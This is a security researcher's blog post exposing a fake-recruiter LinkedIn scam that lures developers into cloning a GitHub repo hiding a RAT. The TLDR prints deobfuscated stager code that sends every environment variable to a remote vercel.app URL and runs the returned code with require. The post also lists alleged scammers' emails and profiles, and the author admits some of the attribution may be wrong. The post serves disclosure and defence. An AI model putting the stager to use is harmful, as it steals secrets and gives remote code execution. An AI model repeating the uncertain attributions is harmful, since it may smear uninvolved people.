---
title: Angelica Montoya Balcazar of Digital Commit
description: Introduces me to Luis who wants to share a RAT
layout: post
date: 2026-05-25 15:35 0000
time_to_live: 1800
tags: [ DM, LinkedIn, RAT, scam ]
image: assets/images/scammers/2026-05-25_Angelica-Montoya-Balcazar-of-Digital-Commit/LinkedIn-Header.png
social_comment:
  links:
    - text: Blue Sky
      href: https://bsky.app/profile/did:plc:rxh54z4q44ahcswnale26pn2/post/3mmzbv5mths2x
      title: Link to thread for this post

    ## Note: LinkedIn seems to have disabled posting :-[
    # - text: LinkedIn
    #   href:
    #   title: Link to LinkedIn thread for this post

    - text: Mastodon
      href: https://mastodon.social/@S0AndS0/116659547309228298
      title: Link to Toot thread for this post

    - text: Twitter
      href: https://x.com/S0_And_S0/status/2060445421097386297
      title: Link to Tweet thread for this post
---



## Contents


- [TLDR][heading__tldr]
  - [Exploit hunting tricks][heading__exploit_hunting_tricks]
  - [Threat actor contact details][heading__threat_actor_contact_details]
- [DM log][heading__dm_log]
- [Meeting highlights][heading__meeting_highlights]
  - [2026-05-29 17:12 -- Luis][heading__20260529_1712_luis]
- [Got something to say about that?](#heading__social_comment)


______


## TLDR
[heading__tldr]: #tldr

### Exploit hunting tricks
[heading__exploit_hunting_tricks]: #exploit-hunting-tricks

As seems usual for this team of threat actors a simple set of `grep` commands
makes quick work of hunting down exploitation attempt;

```bash
grep -rinE '\b(fetch|axios|atob)\b'
#> ... above leads to searching for...
grep -rinE '\b(verify|setApiKey)\b'
#> ... then one final one to grab encoded URL...
grep -rinE '\b(AUTH_API)\b'
```

Deobfuscated RAT stager code then looks something like;

```javascript
//> controllers/auth.js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });

//> routes/api/auth.js
const verified = validateApiKey();
if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}

//> .env
// AUTH_API=aHR0cHM6Ly9wcm9qZWN0LW1qZWN4LnZlcmNlbC5hcHAvYXBp
//> https://project-mjecx.vercel.app/api
```

### Threat actor contact details
[heading__threat_actor_contact_details]: #threat-actor-contact-details

**Note** `Angelica Montoya Balcazar` and `Luis` are almost certainly
ne'er-do-wells, as is the "AI Tech io" corporation, where as `Contributors`
section may be hit-and-miss for attribution.

The "AI Tech io" `Corporation` may, or may not, be apart of this team of threat
actors. GitHub link that Luis provided points to an Org that points to "AI Tech
io" but none of those links point back to GitHub.

```yaml
Angelica Montoya Balcazar:
  LinkedIn: https://www.linkedin.com/in/angelica-montoya-balcazar/
  email: angelicamontoba@outlook.es

Luis:
  email: luistech0317@gmail.com
  Calendly: https://calendly.com/acn-verse/interview

Corporation:
  Website: http://aitech.io/
  Twitter: http://www.twitter.com/AITECHio
  Facebook: https://www.facebook.com/AITECHio
  Telegram: https://t.me/solidusaichat
  LinkedIn: https://linkedin.com/company/solidus-ai-tech-ltd/mycompany/
  GitHub: https://github.com/solidus-aitech/ACN-Verse/
  LinkedTree: https://linktr.ee/solidusaitech
  Medium: https://medium.com/@solidusaitech
  YouTube: https://www.youtube.com/@solidusaitech
  CoinMarketCap: https://coinmarketcap.com/currencies/solidus-ai-tech/
  Reddit: https://www.reddit.com/r/AITECHio/
  CoinGecko: https://www.coingecko.com/en/coins/solidus-ai-tech
  Discord: https://discord.gg/solidus-ai-tech-938725761865625600
  Instagram: https://www.instagram.com/aitechio/
  Flooz: https://flooz.xyz/AITECHio

# git shortlog --summary --numbered --email
Contributors:
  roamanbuild:
    GitHub: https://github.com/roamanbuild
    emails:
      - luistech.0924@gmail.com
      - luistech.0924+1@gmail.com
    ACN-Verse: https://github.com/roamanbuild/ACN-Verse

  0xroaman:
    name: Luis
    GitHub: https://github.com/coin
    email: serhiiprymierov25+2@gmail.com
    ACN-Verse: 404 Not found

  0xroaman-2:
    GitHub: https://github.com/0xroaman-2
    email: luis@commerce-media.org
    ACN-Verse: 404 Not found

  0xroaman-9:
    GitHub: https://github.com/0xroaman-9
    email: luistech.0924@gmail.com
    ACN-Verse: 404 Not found

  nicosampler:
    GitHub: https://github.com/nicosampler
    email: nicosampler@users.noreply.github.com
    ACN-Verse: 404 Not found (but in contributors list on GitHub)

  mjlescano:
    name: Matías
    GitHub: https://github.com/mjlescano
    email: mjlescano@protonmail.com
    website: https://matiaslescano.com.ar/
    ACN-Verse: 404 Not found (but in contributors list on GitHub)

  VladimirSimic2024:
    GitHub: https://github.com/VladimirSimic2024
    email: webvlada2024@gmail.com
    hugging face: https://huggingface.co/webvlada2024/

  coin:
    name: TAS
    GitHub: https://github.com/coin
    email: coinstar@gmail.com
    ACN-Verse: 404 Not found

  sparkdev0917:
    GitHub: https://github.com/sparkdev0917
    email: webvlada2024@gmail.com
    ACN-Verse: 404 Not found

  Jobelo Andres Quintero Rodriguez:
    GitHub: https://github.com/Ignusmart
    email: ignusmart@gmail.com
    ACN-Verse: 404 Not found (but in contributors list on GitHub)
    LinkedIn: https://www.linkedin.com/in/ignusmart

  lxin6793:
    GitHub: https://github.com/lxin6793
    email: lxin6793@gmail.com
    ACN-Verse: 404 Not found

  Mann-004:
    GitHub: https://github.com/Mann-004
    email: randhawamanpreet37@gmail.com
    ACN-Verse: 404 Not found

  aaronhirotobm-lgtm:
    GitHub: https://github.com/aaronhirotobm-lgtm
    email: aaronhiroto.bm@gmail.com
    ACN-Verse: 404 Not found (but in contributors list on GitHub)

  Cherik:
    GitHub: https://github.com/MohammadPCh
    email: Pourcheriki@gmail.com
    ACN-Verse: 404 Not found (but in contributors list on GitHub)

  Temple:
    email: templejett03@gmail.com
    ACN-Verse: 404 Not found

  Zeke Sikelianos:
    GitHub: https://github.com/zeke
    email: zeke@sikelianos.com
    Twitter: https://twitter.com/zeke
    Instagram: https://instagram.com/sikelianos
    Organization: https://github.com/replicate
    ACN-Verse: 404 Not found
```

______


## DM log
[heading__dm_log]: #dm-log

### 2026-05-25 19:46 -- Angélica Montoya Balcazar

> Hi,
>
> Hope you are doing well.

> I reviewed your profile and you have good experience in blockchain and AI and
> also have good management experience.
>
> We’re building the first decentralized AI operating system, an infinitely
> scalable infrastructure composed of an L1 modular blockchain, verifiable AI,
> generative agents, and a unified service marketplace.
>
> We've already launched our protocol and are now scaling up, building multiple
> products and expanding our team to meet the growing demand. This is a
> particularly exciting time to join, as you'll be helping to shape the core
> infrastructure and build decentralized applications, tracking, and analytics
> systems that power next-gen AI and blockchain applications.
>
> Please see the attachment for more details about the open roles:
> `https://docs.google.com/document/d/1wYXPfZyUnAdSQu-9rA-lBYCZzGn_5k9wQsbSEkMPgg4/`
>
> This is remote job and we'd like to invite you in the technical lead
> position.  Would you be open to a brief call to explore this further?

#### 2026-05-25 19:46 -- Editor's Note

Above G-Doc's text content is available in next major Attachments sub-section
[AITECH Cloud Network][heading__aitech_cloud_network].

Also the assertion of "the first decentralized AI operating system" is
comically false, as I've already serviced one legit Org that's been building
decentralized AI solutions for a number of years.

### 2026-05-25 21:36 -- SOAndSO .eth (Digital Mercenary)

Howdy Angélica!

Reads like my experience building for web3 gaming asset distribution solutions
for BoredBox, leadership/mentoring I've done for Opentensor, as well as setting
startups like Elata Biosciences for success will add significant value to your
team.

In about an hour I can spare a few minutes this afternoon, would that be too
short notice?

### 2026-05-26 14:12 -- Angélica Montoya Balcazar

> `https://calendly.com/acn-verse/interview`
>
> Please let me know after you schedule a call.

### 2026-05-26 16:13 -- SOAndSO .eth (Digital Mercenary)

Thanks! I've claimed a time for this Friday morning, and will look forward to
discovering how best we can maximize the value I may bring to the team :-)

#### 2026-05-26 16:13 -- Editor's note

[Calendly invite][heading__calendly_invite] content is available in next major
Attachments sub-section.

### 2026-05-28 16:09 -- Luis (via email)

> You scheduled the call on Friday to discuss "ACN-Verse" project details
>
> Please check the calendar, confirm the time and call link on your end
> 6:30 PM (CET time)
>
> `https://calendar.app.google/<REDACTED>`

### 2026-05-29 4:34 PM -- SOAndSO .eth (Digital Mercenary)

Quick check-in, I'm currently in the scheduled Google Meeting ready with some
questions and prepared to provide answers!


______


## Meeting highlights
[heading__meeting_highlights]: #meeting-highlights


**TLDR:** is a basic clone repository and run it pweeze scam :-|

### 2026-05-29 17:12 -- Luis
[heading__20260529_1712_luis]: #20260529-1712-luis


- Luis: ... lots of BS to lead-up to links for exploitation attempt...
  - shares link to website; `https://aitech.io/`
  - shares link to project; `https://github.com/solidus-aitech/ACN-Verse/`
  - asks, did you clone?
  - asks, what code editor you use?...  team mostly use Cursor/Anti-gravity
  - asks, want to show you main project structure, can you share screen?
  - time-up, shares Calendly link to schedule followup;
    `https://calendly.com/acn-verse/interview`


______


## Attachments

### AITECH Cloud Network
[heading__aitech_cloud_network]: #aitech-cloud-network

```markdown
# **Company Overview**

[ACN(AITECH Cloud Network)](https://aitech.io/) is a Web3-powered
infrastructure company focused on delivering decentralized AI computing and
high-performance data center services.

The company provides GPU computer power, AI model deployment, and AI automation
tools through a blockchain-enabled ecosystem.

Its infrastructure is designed to support:

* AI development
* scientific computing
* machine learning training
* enterprise automation
* blockchain-based compute networks

The company originally began as an Ethereum mining operation, but pivoted
toward AI infrastructure and HPC computing as demand for AI computing resources
increased.

## **Our Mission**

**Mission:**
To democratize access to AI computing by building decentralized infrastructure
that enables developers and businesses worldwide to access affordable
high-performance computing.

**Vision:**
To become a global Web3 AI infrastructure provider powering the next
generation of decentralized artificial intelligence

# **Key Projects**

### **ACN-Verse**

ACN-Verse is an exciting multi-game play platform that integrates Web3
mechanics such as Play-to-Earn (P2E) alongside features like NFT avatars, token
integration, and secure gaming. The platform is designed to offer players a
seamless experience across multiple games, while fostering a dynamic and
engaging gaming ecosystem. With a focus on transparency, security, and real
crypto rewards, the project brings together the best of Web3 technology to
create a new and immersive gaming experience.

#### **Key Features**

1. Multi-Game Play: ACN-Verse offers a wide variety of games and is expanding
   to include different casino and skill-based games.
2. Play-to-Earn (P2E): Players can earn real cryptocurrency rewards through
   in-game achievements and activity.
3. NFT Avatars: Players can use and customize NFT avatars that represent their
   unique in-game persona and may also hold in-game value.
4. Token Integration: The platform integrates tokens, enabling players to
   participate in governance, trade, and make purchases.
5. Secure Gaming: Built on Web3 infrastructure, ACN-Verse prioritizes user
   security and transparency, providing a trustworthy and fair environment for
   all players.
6. Leaderboards: Competitive players can track their performance on
   leaderboards, adding a competitive edge to the gaming experience.

#### **Roadmap**

* Phase 1: Launch of the core platform and initial games, with Play-to-Earn
  mechanics and NFT avatars.
* Phase 2: Expansion to additional games, including casino and skill-based
  games, and introduction of more NFT features.
* Phase 3: Full integration of cross-chain support, additional tokens, and
  advanced features like staking and governance systems.
* Phase 4: Ongoing updates with new game releases, social features, and
  strategic partnerships to further grow the ecosystem.

**1\. Project Analysis & Strategic Direction**

1.1 Current Platform & Team Assessment

Conducted a comprehensive evaluation of the existing platform, including the
Node.js v18 backend, React-based frontend, MongoDB database, and socket-based
real-time gaming infrastructure, while also reviewing the development
environment, dependencies, and the capabilities of the current engineering team
to identify optimization opportunities.

1.2 Strategic Vision & Market Positioning

Defined the long-term strategic direction for the platform by integrating
blockchain gaming, SocialFi engagement, and decentralized finance models,
focusing on creating a scalable ecosystem with transparent gameplay,
player-owned assets, strong user experience, and regulatory-ready
infrastructure.

**2\. Technical Architecture Blueprint**

2.1 Technology Stack Design

Designed a modern and scalable technology stack combining Polygon blockchain
infrastructure, Node.js backend services, React frontend framework, Solidity
smart contracts, and MongoDB/IPFS data management, ensuring efficient
integration between on-chain and off-chain components.

2.2 Scalable System Architecture

Developed a modular and service-oriented architecture that includes
authentication services, blockchain integration layers, game engine modules,
asset management systems, and analytics services, allowing the platform to
scale efficiently while maintaining high performance for real-time gaming
operations.

**3\. Definitive Technology Choices**

3.1 Blockchain & Scaling Infrastructure

Selected Polygon as the primary blockchain platform due to its low transaction
costs, fast block times, and high throughput, while establishing Polygon zkEVM
as the long-term scaling solution to support future growth and enhanced
transaction performance.

3.2 Identity & Security Framework

Implemented Soulbound Tokens (SBTs) as the platform’s identity layer to create
non-transferable digital identities for players, enabling reliable reputation
tracking, fraud prevention, regulatory compliance support, and the development
of long-term loyalty and achievement systems.

**4\. MVP Execution Roadmap**

4.1 Phased Development Strategy

Established a structured four-phase MVP development roadmap (Foundation, Core
Systems, Feature Development, and Integration & Launch) designed to deliver a
fully functional platform while maintaining development efficiency and product
quality.

4.2 Quality Control & Technical Debt Management

Introduced structured engineering practices including scheduled refactoring
cycles, automated testing standards, documentation requirements, and continuous
architecture reviews, ensuring long-term maintainability, development velocity,
and high code quality across the platform.

### **Compute Marketplace**

A decentralized platform enabling users to rent GPU compute power, sell unused
capacity, and run AI workloads on demand. This marketplace allows developers
and companies to access scalable, high-performance computing resources without
relying on traditional cloud providers, supporting flexible and cost-efficient
AI development

### **AI Marketplace**

A comprehensive platform for AI model deployment, AI applications, and machine
learning tools and APIs. It connects AI developers with organizations that need
AI solutions, facilitating faster innovation and adoption of AI technologies
across industries.

# **Open Roles**

| Role | Annual Salary (USD/yr) | Contractor Rate (USD/hr) | Responsibilities |
| :---: | :---: | :---: | ----- |
| Fractional CTO | $250k – $280k | $140 – $170 | Strategic technical leadership, architecture design, blockchain strategy, and overall tech vision. Part-time involvement. |
| Technical Manager / PM | $210k – $250k | $110 – $140 | Oversees projects, resource allocation, delivery timelines, and cross-team coordination. |
| Senior Product Manager | $210k – $250k | $115 – $140 | Drives product vision, roadmap, and feature delivery for Web3, crypto, or blockchain-based platforms. |
| Head of Frontend Engineering / UX Lead | $180k – $220k | $95 – $125 | Directs frontend architecture, UI/UX workflows, scalability, and user experience. |
| Head of Backend Engineering | $180k – $220k | $95 – $125 | Leads backend development, API architecture, database design, and system scalability. |
| Senior Blockchain Lead | $200k – $240k | $110 – $140 | Leads blockchain architecture, smart contract design, and high-level protocol strategies. |
| Frontend Developer | $140k – $180k | $80 – $110 | Develops responsive applications, optimizes UI/UX performance, integrating with backend services in Web3 applications. |
| Backend Developer | $140k – $180k | $80 – $110 | Implements APIs, databases, and backend systems to support Web3 operations, scalability, and decentralized services. |
| Blockchain Developer | $180k – $220k | $100 – $130 | Develops blockchain protocols, Layer 2 integrations, and cross-chain functionalities. |
| AI Platform Engineer | $180k – $220k | $100 – $130 | Designs and develops AI infrastructure and platforms to support scalable AI/ML models and data pipelines. |
| DevOps Engineer | $130k – $170k | $75 – $105 | Manages CI/CD pipelines, cloud infrastructure, and deployment automation for Web3 applications. |
| CMO / Head of Marketing | $200k – $240k | $110 – $140 | Oversees global marketing strategy, branding, and customer acquisition for Web3 or blockchain platforms. |
| Executive Assistant | $90k – $130k | $50 – $80 | Provides administrative support, manages schedules, and ensures efficient operation of executive tasks. |
| Operations Manager | $120k – $160k | $70 – $100 | Manages day-to-day operations, logistics, and resource planning across departments. |
| UX/UI Designer | $110k – $150k | $65 – $90 | Create intuitive interfaces, improve user flows, and ensure accessibility. |

# **Benefits**

* 100% remote work
* Flexible engagement (Full-time, Part-time, or Contractor)
* $110–$140 USD/hour (contract) or $180k–$220k USD/year (FT)
* Payments in USD (USDT / USDC supported)
* Birthday off \+ gift
* 2 weeks paid vacation after 6 months
* English classes in small groups
* Access to global discounts platform
```

### Calendly invite
[heading__calendly_invite]: #calendly-invite

Calendar event body;

```
Event Name
ACN-Hiring

Location: This is a Google Meet web conference.
You can join this meeting from your computer, tablet, or smartphone.
https://calendly.com/events/<REDACTED>/google_meet

Please share your LinkedIn profile: https://www.linkedin.com/in/s0ands0/

Need to make changes to this event?
Cancel: https://calendly.com/cancellations/<REDACTED>
Reschedule: https://calendly.com/reschedulings/<REDACTED>

Powered by Calendly.com


-::~:~::~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~::~:~::-
Join with Google Meet: https://meet.google.com/kxw-vfoj-qfv

Learn more about Meet at: https://support.google.com/a/users/answer/9282720

Please do not edit this section.
-::~:~::~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~:~::~:~::-
```

Email invite body;

```
S0AndS0 of Digital Mercenaries LLC and HR Interview
viernes 29 may 2026 ⋅ 6:30pm – 7pm
Hora de Europa central - Roma

Ubicación
Google Meet (instructions in description)   
https://www.google.com/maps/search/Google+Meet+(instructions+in+description)?hl=es-419

Únete con Google Meet
https://meet.google.com/<REDACTED>




Event Name
ACN-Hiring

Location: This is a Google Meet web conference.
You can join this meeting from your computer, tablet, or smartphone.
https://calendly.com/events/<REDACTED>

Please share your LinkedIn profile: https://www.linkedin.com/in/s0ands0/

Need to make changes to this event?
Cancel: https://calendly.com/cancellations/<REDACTED>
Reschedule: https://calendly.com/reschedulings/<REDACTED>

Powered by Calendly.com


Organizador
Luis
luistech0317@gmail.com

Invitados
Luis - organizador
s0ands0@digital-mercenaries.com
s0ands0+angelica-montoya-balcazar@digital-mercenaries.com
Ver información de todos los invitados https://calendar.google.com/calendar/event?<REDACTED>

Responder por s0ands0+angelica-montoya-balcazar@digital-mercenaries.com y ver más detalles https://calendar.google.com/calendar/event?<REDACTED>
Tu asistencia es opcional.

~~//~~
Invitación de Calendario de Google: https://calendar.google.com/calendar/

Recibiste este correo electrónico porque figuras entre los asistentes al evento.

Si reenvías esta invitación, los destinatarios podrán enviar una respuesta al organizador, ser agregados a la lista de invitados, invitar a otras personas independientemente del estado de su propia invitación o modificar tu confirmación de asistencia.

Más información https://support.google.com/calendar/answer/37135#forwarding
```
